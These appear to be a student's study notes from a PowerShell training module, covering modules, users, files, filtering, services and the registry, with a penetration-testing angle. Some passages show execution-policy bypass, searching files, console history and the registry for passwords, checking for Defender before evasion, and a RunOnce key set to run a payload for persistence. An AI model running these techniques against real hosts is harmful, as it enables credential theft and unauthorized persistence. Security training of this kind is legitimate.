						- `$env:PSModulePath`
				- When the PowerSploit.psd1 module is imported, the `Get-NetLocalgroup` function is recognized. This happens because several modules are included when we load PowerSploit.psd1.
					- It is possible to permanently add a module or several modules by adding the files to the referenced directories in the PSModulePath. This action makes sense if we were using a Windows OS as our primary attack host, but on an engagement, our time would be better off just transferring specific scripts over to the attack host and importing them as needed.
	- **Execution Policy** - *not a security control*, designed to give IT admins a tool to set parameters and safeguards for themselves.
		- The host's execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.
			- To check Execution Policy State
				- `Get-ExecutionPolicy`
			- To set Execution Policy
				- `Set-ExecutionPolicy undefined`
				- undefined tells PowerShell that we do not wish to limit our interactions.
			- To test it out
				- `Import-Module .\PowerSploit.psd1`
			- Change Execution Policy By Scope
				- `Set-ExecutionPolicy -scope Process`
				- `Get-ExecutionPolicy -list`
				- By changing it at the Process level, our change will revert once we close the PowerShell session.
				- This [blog post](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) has some creative ways that we have used on real-world engagements with great success.
	- Calling Cmdlets and Functions From Within a Module
		- If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use `Get-Command -Module <modulename>` to enlighten us.
		- Use **Get-Command** to call cmdlets and functions from within a module
			- `Get-Command -Module PowerSploit`
	- Finding & Installing Modules from PowerShell Gallery & GitHub
		- **PowerShell Gallery**
			- There is already a module built into PowerShell meant to help us interact with the PowerShell Gallery called `PowerShellGet`. Let us take a look at it:
				- `Get-Command -Module PowerShellGet`
			- **Find-Module** to find the **AdminToolbox** module:
				- `Find-Module -Name AdminToolbox`
				- **AdminToolbox** is a collection of several other modules with tools meant for Active Directory management, Microsoft Exchange, virtualization, and many other tasks an admin would need on any given day.
				- `Find-Module -Name AdminToolbox | Install-module`
			- This differs from custom modules or modules we bring onto the host (from GitHub, for example). We will have to manually import it each time we want to use it unless we modify our PowerShell Profile.
				- We can find the locations for each specific PowerShell profile [Here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2). Besides creating our own modules and scripts or importing them from the PowerShell Gallery, we can also take advantage of [Github](https://github.com/) and all the amazing content the IT community has come up with externally. Utilizing `Git` and `Github` for now requires the installation of other applications and knowledge of other concepts we have yet to cover, so we will save this for later in the module.
	- **Tools To Be Aware Of**
		- A few PowerShell modules and projects penetration testers and sysadmins should be aware of: 
			- [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8): AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.
			- [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps): This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.
			- [Empire / Situational Awareness](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness): Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by [BC Security](https://github.com/BC-SECURITY) as a part of their Empire Framework.
			- [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.
			- [BloodHound / SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.
- ## User and Group Management (PowerShell)
	- **User accounts** - a way for personnel to access and use a host's resources. In certain circumstances, the system will also utilize a specially provisioned user account to perform actions. When thinking about [accounts](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts), we typically run into four different types:
		- **Service Accounts**
		- **Built-in accounts**
			- `Administrator` - This account is used to accomplish administrative tasks on the local host.
			- `Default Account` - The default account is used by the system for running multi-user auth apps like the Xbox utility.
			- `Guest Account` - This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.
			- `WDAGUtility Account` - This account is in place for the Defender Application Guard, which can sandbox application sessions.
		* **Local users** - only permission to access the specific host they were created on
			* domain users can log into any host in domain
		* **Domain users** - granted rights from the domain to access resources based on user and group membership
			* can log into any host in the domain
	* **Active Directory (AD)** - a directory service for Windows environments that provides a central point of management for `users`, computers, `groups`, network devices, `file shares`, group policies, `devices`, and trusts with other organizations. Think of it as the gatekeeper for an enterprise environment. Anyone who is a part of the domain can access resources freely, while anyone who is not is denied access to those same resources or, at a minimum, stuck waiting in the visitors center.
		* To learn more about AD, you should check out the [Introduction to Active Directory module](https://academy.hackthebox.com/module/details/74) (later in course)
	*  **User groups** - a way to sort user accounts logically, provides granular permissions and access to resources without having to manage each user manually.
		* Use **Get-LocalGroup** (run as admin)
			* `Get-LocalGroup`
	* **Adding/Removing/Editing User Accounts & Groups**
		* To identify Local Users
			* `Get-LocalUser`
		* To create a new user
			* `New-LocalUser -Name "JLawrence" -NoPassword`
		* To modify a user use **Set-LocalUser**
			* `$Password = Read-Host -AsSecureString`
			* `Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"`
			* `Get-LocalUser`
		* To identify Local Groups
			* `Get-LocalGroup`
			* To get group members
				* `Get-LocalGroupMember -Name "Users"`
		* To add another group or user to a group use **Add-LocalGroupMember**
			* `Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"`
			* `Get-LocalGroupMember -Name "Remote Desktop Users"`
	* **Managing Domain Users and Groups**
		* Before we can access the cmdlets we need and work with Active Directory, we must install the `ActiveDirectory` PowerShell Module.
			* If you installed the AdminToolbox, the AD module might already be on your host. If not, we can quickly grab the AD modules and get to work. One requirement is to have the optional feature `Remote System Administration Tools` installed.
				* `Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online`
					* This feature is the only way to get the official ActiveDirectory PowerShell module. The edition in AdminToolbox and other Modules is repackaged, so use caution.
					* Installs `ALL` RSAT features in the Microsoft Catalog. If we wish to stay lightweight, we can install the package named `Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`
				* Locate the **AD Module**
					* `Get-Module -Name ActiveDirectory -ListAvailable `
				* **Get-ADUser** used to locate a specific user for AD User and Group management
					* `Get-ADUser -Filter *`
					* The parameter `-Filter *` lets us grab all users within Active Directory. 
					* We can use the `-Identity` parameter to perform a more specific search for a user by `distinguished name, GUID, the objectSid, or SamAccountName`. 
					* For more reading on the topic, check out [this article](https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties) or the [Intro To Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module (later in course). We are going to search for the user `TSilver` now.
				* Get a specific user
					* `Get-ADUser -Identity TSilver`
					* We can see from the output several pieces of information about the user, including:
						- `Object Class`: which specifies if the object is a user, computer, or another type of object.
						- `DistinguishedName`: Specifies the object's relative path within the AD schema.
						- `Enabled`: Tells us if the user is active and can log in.
						- `SamAccountName`: The representation of the username used to log into the ActiveDirectory hosts.
						- `ObjectGUID`: Is the unique identifier of the user object.
						- etc.
				- Searching on an attribute
					- `Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}`
					- Result for a user with an email address matching our naming context `*greenhorn.corp`. This is just one example of attributes we can filter on.
				- To create a **New ADUser**
					- `New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true `
					- Creates a new user for an employee named `Mori Tanaka` who just joined Greenhorn.
					- View new ADUser in table format
						- `Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail`
				- To modify an ADUser, use **Set-ADUser** to change the users attributes
					- `Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"  `
					- View udpated ADUser
						- `Get-ADUser -Identity MTanaka -Property Description`
	- *Users and groups provide a wealth of opportunities regarding Pentesting a Windows environment. We will often see users misconfigured. They may be given excessive permissions, added to unnecessary groups, or have weak/no passwords set. Groups can be equally as valuable. Often groups will have nested membership, allowing users to gain privileges they may not need. ==These misconfigurations can be easily found and visualized with Tools like [Bloodhound](https://github.com/BloodHoundAD/BloodHound). For a detailed look at enumerating Users and Groups, check out the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module.*==
- ## Working with Files and Directories (PowerShell)
	- **Creating/Moving/Deleting Files & Directories**
		- Common Comands Used for File & Folder Management:
			- `Get-Item` (gi) - Retrieve an object (could be a file, folder, registry object, etc.)
			- `Get-ChildItem` (ls / dir / gci) - Lists out the content of a folder or registry hive.
			- `New-Item` (md / mkdir / ni) - Create new objects. ( can be files, folders, symlinks, registry entries, and more)
			- `Set-Item` (si) - Modify the property values of an object.
			- `Copy-Item` (copy / cp / ci) - Make a duplicate of the item.
			- `Rename-Item` (ren / rni) - Changes the object name.
			- `Remove-Item` (rm / del / rmdir) - Deletes the object.
			- `Get-Content` (cat / type) - Displays the content within a file or object.
			- `Add-Content` (ac) - Append content to a file.
			- `Set-Content` (sc) - overwrite any content in a file with new data.
			- `Clear-Content` (clc) - Clear the content of the files without deleting the file itself.
			- `Compare-Object` (diff / compare) - Compare two or more objects against each other. This includes the object itself and the content within.
		- ***Scenario**: Greenhorn's new Security Chief, Mr. Tanaka, has requested that a set of files and folders be created for him. He plans to use them for SOP documentation for the Security team. Since he just got host access, we have agreed to set the file & folder structure up for him. If you would like to follow along with the examples below, please feel free. For your practice, we removed the folders and files discussed below so you can take a turn recreating them.*
			- First, we are going to start with the folder structure he requested. We are going to make three folders named :
				- `SOPs`
				    - `Physical Sec`
				    - `Cyber Sec`
				    - `Training`
			* We will use the `Get-Item`, `Get-ChildItem`, and `New-Item` commands to create our folder structure. 
				* Determine where we are:
					* `Get-Location`
				* Make a folder
					* `new-item -name "SOPs" -type directory`
				* Make more directories
					* `cd SOPs` 
						* move into SOPs folder
					* `mkdir "Physical Sec"`
					* `mkdir "Cyber Sec"`
					* `mkdir "Training"`
					* `Get Child-Item`
						* to view new folders in SOPs folder
			* Now that we have our directory structure in place. It's time to start populating the files required. Mr. Tanaka asked for a Markdown file in each folder like so:
				- `SOPs` > ReadMe.md
				    - `Physical Sec` > Physical-Sec-draft.md
				    - `Cyber Sec` > Cyber-Sec-draft.md
				    - `Training` > Employee-Training-draft.md
				- In each file, he has requested this header at the top:
					- Title: Insert Document Title Here
					- Date: x/x/202x
					- Author: MTanaka
					- Version: 0.1 (Draft)
				- To add ReadMe.md
					- `new-Item "Readme.md" -ItemType File`
				- To add Physical-Sec-draft.md
					- `cd '.\Physical Sec\'`
					- `ls`
					- `new-Item "Physical-Sec-draft.md" -ItemType File`
				- To add Cyber-Sec-draft.md
					- `cd ..`
					- `cd '.\Cyber Sec\'`
					- `new-Item "Cyber-Sec-draft.md" -ItemType File`
				- To add Employee-Training-draft.md
					- `cd ..`
					- `cd .\Training\`
					- `ls
					- `new-Item "Employee-Training-draft.md" -ItemType File
				- To view SOPs tree structure
					- `cd ..`
					- `tree /F`
					- ```
						C:.
						│   Readme.md
						│
						├───Cyber Sec
						│       Cyber-Sec-draft.md
						│
						├───Physical Sec
						│       Physical-Sec-draft.md
						│
						└───Training
						        Employee-Training-draft.md```
				* To add content to files (adding headers to each file)
					* ```Add-Content .\Readme.md "Title: Insert Document Title Here
					Date: x/x/202x
					Author: MTanaka
					Version: 0.1 (Drafdt)"
					* Creating files over and over by hand can get tiresome. This is where automation and scripting come into place
			* ***Scenario Cont**.: Mr. Tanaka has asked us to change the name of the file `Cyber-Sec-draft.md` to `Infosec-SOP-draft.md`.*
				* To rename an object
					* `ls`
					* `Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md`
					* `ls`
					* We could take this further and rename all files within a directory or change the file type or several different actions. In our example below, we will change the names of all text files in Mr. Tanakas Desktop from `file.txt` to `file.md`.
						* `ls`
						* `get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}`
						* `ls`
						* As we can see above, we had five text files on the Desktop. We changed them to `.md` files using `get-childitem -Path *.txt` to select the objects and used `|` to send those objects to the `rename-item -NewName {$_.name -replace ".txt",".md"}` cmdlet which renames everything from its original name ($_.name) and replaces the `.txt` from name to `.md`. This is a much faster way to interact with files and perform bulk actions.
	* **File & Directory Permissions**
		* Way of determining who has access to a specific object and what they can do with it
		* **Permission Types** Explained:
			- `Full Control`: Full Control allows for the user or group specified the ability to interact with the file as they see fit. This includes everything below, changing the permissions, and taking ownership of the file.
			- `Modify`: Allows reading, writing, and deleting files and folders.
			- `List Folder Contents`: This makes viewing and listing folders and subfolders possible along with executing files. This only applies to `folders`.
			- `Read and Execute`: Allows users to view the contents within files and run executables (.ps1, .exe, .bat, etc.)
			- `Write`: Write allows a user the ability to create new files and subfolders along with being able to add content to files.
			- `Read`: Allows for viewing and listing folders and subfolders and viewing a file's contents.
			- `Traverse Folder`: Traverse allows us to give a user the ability to access files or subfolders within a tree but not have access to the higher-level folder's contents. This is a way to provide selective access from a security perspective.
		- Windows ( NTFS, in general ) allows us to set permissions on a parent directory and have those permissions populate each file and folder located within that directory.
- ## Finding & Filtering Content (PowerShell)
	- In PowerShell, everything is an Object
		- **`What is an Object?`** An `object` is an `individual` instance of a `class` within PowerShell. Let us use the example of a computer as our object. The total of everything (parts, time, design, software, etc.) makes a computer a computer.
		- **`What is a Class?`** A class is the `schema` or 'unique representation of a thing (object) and how the sum of its `properties` define it. The `blueprint` used to lay out how that computer should be assembled and what everything within it can be considered a Class.
		- **`What are Properties?`** Properties are simply the `data` associated with an object in PowerShell. For our example of a computer, the individual `parts` that we assemble to make the computer are its properties. Each part serves a purpose and has a unique use within the object.
		- **`What are Methods?`** Simply put, methods are all the functions our object has. Our computer allows us to process data, surf the internet, learn new skills, etc. All of these are the methods for our object.
	- **Get an Object (User) and its Properties/Methods**
		- `Get-LocalUser administrator | get-member`
		- ![[Pasted image 20231109103400.png]]
		- Now that we can see all of a user's properties let us look at what those properties look like when output by PowerShell. The [Select-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object?view=powershell-7.2) cmdlet will help us achieve this.
			- `Get-LocalUser administrator | Select-Object -Property *`
			- ![[Pasted image 20231109103511.png]]
		- **Filtering on Properties**
			- `Get-LocalUser * | Select-Object -Property Name,PasswordLastSet`
			- ![[Pasted image 20231109103637.png]]
		- **Sorting and Grouping**
			- `Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled`
			- ![[Pasted image 20231109103718.png]]
			- We utilized the `Sort-Object` and `Group-Object` cmdlets to find all users, `sort` them by `name`, and then `group` them together based on their `Enabled` property.
			- From the output, we can see that several users are disabled and not in use for interactive logon.
	- **Sorting and Filtering Get-Service**
		- `get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl`
	- The [Where-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2) (alias is `where` and parameter to match is `-like`) can evaluate objects passed to it and their specific property values to look for the information we require. Consider this `scenario`:
		- ***Scenario**: We have just landed an initial shell on a host via an unsecured protocol exposing the host to the world. Before we get any further in, we need to assess the host and determine if any defensive services or applications are running. First, we look for any instance of `Windows Defender` services running.*
			- `Get-Service | where DisplayName -like '*Defender*'`
			- ![[Pasted image 20231109104417.png]]
			- We cannot just dive in and start doing things because we are likely to be spotted by the defensive services, but it is good that we spotted them and can now regroup and make a plan for defensive evasion actions to be taken.
		- `Where` and many other cmdlets can `evaluate` objects and data based on the values those objects and their properties contain. 
		- A quick list (not all-encompassing) of other useful expressions we can utilize:
			- `Like` - Like utilizes wildcard expressions to perform matching. For example, `'*Defender*'` would match anything with the word Defender somewhere in the value.
			- `Contains` - Contains will get the object if any item in the property value matches exactly as specified.
			- `Equal to` - Specifies an exact match (case sensitive) to the property value supplied.
			- `Match` - Is a regular expression match to the value supplied.
			- `Not` - specifies a match if the property is `blank` or does not exist. It will also match `$False`.
		- `Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *`
			- shows properties for the Defender services
	- **What is the PowerShell Pipeline? ( | )**
		- Provides the end user a way to chain commands together.
		- The Pipeline will interpret and execute the commands one at a time from left to right.
			- `Command-1 | Command-2 | Command-3`
		- **Using the Pipeline to Count Unique Instances**
			- `get-process | sort | unique | measure-object`
			`Count              : 113`
			* Process output sorted, filtered for unique instances (no duplicate names), or just a number output from the `Measure-Object` cmdlet.
		* **Pipeline Chain Operators ( && and | | )**
			* *Currently, Windows PowerShell 5.1 and older do not support Pipeline Chain Operators used in this fashion. If you see errors, you must install PowerShell 7 alongside Windows PowerShell. They are not the same thing.* Install PowerShell 7 [here](https://www.thomasmaurer.ch/2019/07/how-to-install-and-update-powershell-7/)
			* `&&`: Sets a condition in which PowerShell will execute the next command inline `if` the current command `completes properly`.
			* `||`: Sets a condition in which PowerShell will execute the following command inline `if` the current command `fails`.
			* ***Scenario:** Let's say we write a command chain where we want to get the content within a file and then ping a host. We can set this to ping the host if the initial command succeeds with `&&` or to run only if the command fails `||`. Let's see both.*
				* **Successful Pipeline**
					* `Get-Content '.\test.txt' && ping 8.8.8.8`
					* In this output, we can see that both commands were `successful` in execution because we get the output of the file `test.txt` printed to the console along with the results of our `ping` command.
				* **Stop Unless Failure**
					* `Get-Content '.\test.txt' || ping 8.8.8.8`
					* With this output, we can see that our pipeline `closed` itself after the `first` command since it executed adequately, printing the output of the file to the console.
				* **Success in Failure**
					* `Get-Content '.\testss.txt' || ping 8.8.8.8`
					* Here we can see that our pipeline executed `completely`. Our first command `failed` because the filename was typed wrong, and PowerShell sees this as the file we requested does not exist. Since the first command failed, our second command was executed.
		* **Finding Data within Content**
			* Some tools exist, like `Snaffler`, `Winpeas`, and the like, that can search for interesting files and strings
			* What if we `cannot` bring a new tool onto the host?
				* Combining cmdlets we have practiced in previous sections paired with new cmdlets like `Select-String` and `where` is an excellent way for us to root through a filesystem.
				* [Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) (`sls` as an alias) for those more familiar with using the Linux CLI, functions much in the same manner as `Grep` does or `findstr.exe` within the Windows Command-Prompt.
		* **Finding Interesting Files Within a Directory**
			* On a given day, we may write text files, a bit of Markdown, some Python, PowerShell, and many others. We want to look for those things when hunting through a host since it is where users and admins will interact most.
				* `Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse `
			* **Narrowing Our Search**
				* `Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}`
				* We only returned the files that matched the file type `txt` because of our filter's `$_.Name` attribute. Now that we know it works, we can add the rest of the file types we will look for using an `-or` statement within the where filter.
				* `Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}`
				* Now that we have our list of interesting files, we could turn around and `pipe` those objects into another cmdlet (`Select-String`) that searches through their content for interesting strings and keywords or phrases.
				* `Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"`
				* ![[Pasted image 20231109113202.png]]
				* Let's combine our original file search with our content filter
				* `Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"`
				* ![[Pasted image 20231109113311.png]]
	* ==**Helpful Directories to Check**==
		* Looking in a Users `\AppData\` folder is a great place to start. Many applications store `configuration files`, `temp saves` of documents, and more.
		- A Users home folder `C:\Users\User\` is a common storage place; things like VPN keys, SSH keys, and more are stored. Typically in `hidden` folders. (`Get-ChildItem -Hidden`)
		- The Console History files kept by the host are an endless well of information, especially if you land on an administrator's host. You can check two different points:
		    - `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
		    - `Get-Content (Get-PSReadlineOption).HistorySavePath`
		- Checking a user's clipboard may also yield useful information. You can do so with `Get-Clipboard`
		- Looking at Scheduled tasks can be helpful as well.
		- etc.
* ## Working with Services (PowerShell)
	* ***Scenario:** Mr. Tanaka messaged the Helpdesk stating that he noticed a window pop up earlier in the day and thought it was just Windows updates running, as lots of information flashed by in the window. However, now he reports that alerts stating that Defender is turned off also popped up, and his host is acting sluggish. We need to look into this, determine what services related to Defender are shut off, and enable them again if we can. Later we will look into the event logs and see what happened.*
	* **Services** in the Windows Operating system at their core are singular instances of a component running in the background that manages and maintains processes and other needed components for applications used on the host. A **process** can be considered a temporary container for a user or application to perform tasks.
	* Windows has **three categories of services**
		* **Local Services**
		* **Network Services**
		* **System Services**
	* Many different services (including the core components within the Windows operating system) handle multiple instances of processes simultaneously.
	* PowerShell provides us with the module `Microsoft.PowerShell.Management`, which contains several cmdlets for interacting with Services. 
		* **Getting Help (Services)**
			* `Get-Help *-Service`
		* Will need permissions to manage or modify services
		* **Investigating Running Services**
			* `Get-Service | ft DisplayName,Status`
			* Services can have a status set as Running, Stopped, or Paused and can be set up to start manually (user interaction), automatically (at system startup), or on a delay after system boot.
			* `Get-Service | measure`
			* Measures the number of services that appear in the listing just to get a sense of how many we are working with.
		* **Precision Look at Defender**
			* `Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status`
			* Piped our service listing into `format-table` and chose the properties `DisplayName` and `Status` to display in our console. 
		* **Resume / Start / Restart a Service**
			* `Start-Service WinDefend`
			* Started WinDefend service, now to check it
			* `Get-Service WinDefend`
		* **Stopping a Service**
			* `Stop-Service Spooler`
			* `Get-Service Spooler`
		* **Set-Service to Disabled from Automatic**
			* `Get-Service Spooler | Select-Object -Property Name, StartType, Status, DisplayName`
			* `Set-Service -Name Spooler -StartType Disabled`
			* Set the startup type of the service now from Automatic to Disabled until further investigation can be taken.
			* `Get-Service -Name Spooler | Select-Object -Property StartType`
			* *Removing services in PowerShell is difficult right now. The cmdlet `Remove-Service` only works if you are using PowerShell version 7. By default, our hosts will open and run PowerShell version 5.1. For now, if you wish to remove a service and its entries, use the `sc.exe` tool.*
	* **How Do We Interact with Remote Services using PowerShell?**
		*  The `-ComputerName` parameter allows us to specify that we want to query a remote host.
		* **Remotely Query Services**
			* `Get-Service -ComputerName ACADEMY-ICL-DC`
		* **Filtering our Output**
			* `Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}`
			* Our results returned only the services with a status when it was run of `Running`.
			* Regarding remote interactions, we can also use the `Invoke-Command` cmdlet:
				* **Invoke-Command**
					* `Invoke-Command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}`
						* `Invoke-Command`: We are telling PowerShell that we want to run a command on a local or remote computer.
						* `Computername`: We provide a comma-defined list of computer names to query.
						* `ScriptBlock {commands to run}`: This portion is the enclosed command we want to run on the computer. For it to run, we need it to be enclosed in {}.
	* ***Scenario:** Earlier in this section, we saw a service (Spooler) that had a DisplayName that was modified. This could potentially clue us in on an issue within our environment. Using the `-ComputerName` parameter or the Invoke-Command cmdlet to query all of the hosts within our environment and check the DisplayName properties to see if any other host has been affected. As an administrator, having access to this kind of power is invaluable and can often help reduce the time a threat is on the host and help get ahead of the issue and work to kick the threat out.*
* ## Working with the Registry (PowerShell)
	* fixed Docker and wsl issue with Registry, it is powerful and very important
	* The **Registry** can be considered a hierarchal tree that contains two essential elements:
		* **Keys** - in essence, are containers that represent a specific component of the PC.
			* can contain other keys and values as data. These entries can take many forms, and naming contexts only require that a Key be named using alphanumeric (printable) characters and is not case-sensitive. As a visual example of Keys, if we look at the image below, each folder within the `Green rectangle` is a Key and contains sub-keys.
				* ![[Pasted image 20231113095038.png]]
		* **Registry Key Files** - a host systems Registry root keys are stored in several different locations and can be accessed from `C:\Windows\System32\Config\`. Along with these Key files, registry hives are held throughout the host in various other places:
			* `Get-ChildItem C:\Windows\System32\Config\`
		* For a detailed list of all Registry Hives and their supporting files within the OS, we can look [HERE]([https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)). Now let's discuss Values within the Registry.
	* **Values** - represent data in the form of objects that pertain to that specific Key. These values consist of a name, a type specification, and the required data to identify what it's for. The image below visually represents `Values` as the data between the `Orange` lines. Those values are nested within the Installer key, which is, in turn, inside another key.
		* ![[Pasted image 20231113095133.png]]
		* We can reference the complete list of Registry Key Values [HERE]([https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types)). In all, there are 11 different value types that can be configured.
	* This tree stores all the required information for the operating system and the software installed to run under subtrees (think of them as branches of a tree).
		* This information can be anything from settings to installation directories to specific options and values that determine how everything functions.
	* *As Pentesters, the Registry is a great spot to find helpful information, plant persistence, and more. [MITRE]([https://attack.mitre.org/techniques/T1112/](https://attack.mitre.org/techniques/T1112/)) provides many great examples of what a threat actor can do with access (locally or remotely) to a host's registry hive.*
	* **Registry Hives**
		* Each Windows host has a set of predefined Registry keys that maintain the host and settings required for use.
		* Hive Breakdown:
			* HKEY_LOCAL_MACHINE (`HKLM`) - This subtree contains information about the computer's `physical state`, such as hardware and operating system data, bus types, memory, device drivers, and more.
			* HKEY_CURRENT_CONFIG (`HKCC`) - This section contains records for the host's `current hardware profile`. (shows the variance between current and default setups) Think of this as a redirection of the [HKLM]([https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc739525(v=ws.10)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc739525(v=ws.10))) CurrentControlSet profile key.
			* HKEY_CLASSES_ROOT (`HKCR`) - Filetype information, UI extensions, and backward compatibility settings are defined here.
			* HKEY_CURRENT_USER (`HKCU`) - Value entries here define the specific OS and software settings for each specific user. `Roaming profile` settings, including user preferences, are stored under HKCU.
			* HKEY_USERS (`HKU`) - The `default` User profile and current user configuration settings for the local computer are defined under HKU.
	* **Why Is The Information Stored Within The Registry Important?**
		* As a pentester, the Registry can be a treasure trove of information that can help us further our engagements.
			* Everything from what software is installed, current OS revision, pertinent security settings, control of Defender, and more can be found in the Registry.
			* There is no better single point to find all of it and have the ability to make widespread changes to the host simultaneously.
			* From an offensive perspective, the Registry is hard for Defenders to protect. The hives are enormous and filled with hundreds of entries. Finding a singular change or addition among the hives is like hunting for a needle in a haystack (unless they keep solid backups of their configurations and host states).
	* **To access the Registry**
		* From the CLI
			* `reg.exe`
			* or
			* `Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property`
				* Only shows us the name of the services/applications currently running. If we wished to see each key and object within a hive, we could also use `Get-ChildItem` with the `-Recurse` parameter like so:
					* `Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse`
				* We can make our output easier to read using the `Get-ItemProperty` cmdlet.
					* `Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
					* We issued the `Get-ItemProperty` command, specified out `path` as looking into the Registry, and specified the key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. The output provides us with the `name` of the services started and the `value` that was used to run them (the path they were executed from). This Registry key is used to `start` services/applications when a user `logs in` to the host. ==It is a great key to have visibility over and to keep in mind as a penetration tester.== There are several versions of this key which we will discuss a little later in this section.
			* Using **Get-ItemProperty** is much more readable than Get-Item was.
			* When it comes to querying information, we can also use Reg.exe.
				* `reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip`
				* Output
				* ```HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
				   Path64    REG_SZ    C:\Program Files\7-Zip\
				   Path    REG_SZ    C:\Program Files\7-Zip\```
				* We queried the `HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip` key with Reg.exe, which provided us with the associated values. We can see that `two` values are set, `Path` and `Path64`, the ValueType is a `Reg_SZ` value which specifies that it contains a Unicode or ASCII string, and that value is the path to 7-Zip `C:\Program Files\7-Zip"\`.
	* **Finding Info In The Registry**
		* Use `reg.exe` to search for keywords and strings like "Password" and "Username" through key and value names or the data contained.
		* Example:
			* `REG QUERY HKCU /F "password" /t REG_SZ /S /K`
				* `Reg query`: We are calling on Reg.exe and specifying that we want to query data.
				- `HKCU`: This portion is setting the path to search. In this instance, we are looking in all of HKey_Current_User.
				- `/f "password"`: /f sets the pattern we are searching for. In this instance, we are looking for "Password".
				- `/t REG_SZ`: /t is setting the value type to search. If we do not specify, reg query will search through every type.
				- `/s`: /s says to search through all subkeys and values recursively.
				- `/k`: /k narrows it down to only searching through Key names.
	- **Creating and Modifying Registry Keys and Values**
		- When dealing with the modification or creation of `new keys and values`, we can use standard PowerShell cmdlets like `New-Item`, `Set-Item`, `New-ItemProperty`, and `Set-ItemProperty` or utilize `Reg.exe` again to make the changes we need.
			- Let's try and create a new Registry Key below. For our example, we will create a new test key in the RunOnce hive `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` named `TestKey`. By placing the key and value in RunOnce, after it executes, it will be deleted.
			- ***Scenario**: We have landed on a host and can add a new registry key for persistence. We need to set a key named `TestKey` and a value of `C:\Users\htb-student\Downloads\payload.exe` that tells RunOnce to run our payload we leave on the host the next time the user logs in. This will ensure that if the host restarts or we lose access, the next time the user logs in, we will get a new shell.*
